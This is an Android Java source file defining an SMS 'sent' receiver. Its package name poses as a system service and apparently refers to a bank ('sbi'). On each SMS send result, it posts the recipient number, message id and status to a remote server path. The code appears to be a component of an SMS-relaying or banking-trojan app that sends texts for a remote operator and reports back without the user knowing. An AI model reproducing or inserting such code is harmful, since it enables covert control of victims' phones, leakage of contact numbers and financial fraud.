package com.system.service.sbi.MinorServices;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.system.service.sbi.HelperService;

import org.json.JSONException;
import org.json.JSONObject;

public class SentReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        String status = "";

        switch (getResultCode()) {
            case Activity.RESULT_OK:
                status = "Sent";
                Log.d(HelperService.TAG, "SMS sent successfully.");
                break;
            default:
                status = "SentFailed";
                Log.d(HelperService.TAG, "SMS failed to send.");
                break;
        }

        JSONObject data = new JSONObject();
        try {
            HelperService helperService = new HelperService();
            data.put("status", status + " to "+number);
            data.put("id", id);
            data.put("site", helperService.SITE());
            HelperService.postRequest(helperService.SMSSavePath(), data, context, new HelperService.ResponseListener(){
                @Override
                public void onResponse(String result) {
                    Log.d("mywork", "status updated Result, "+ result);
                };
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
}
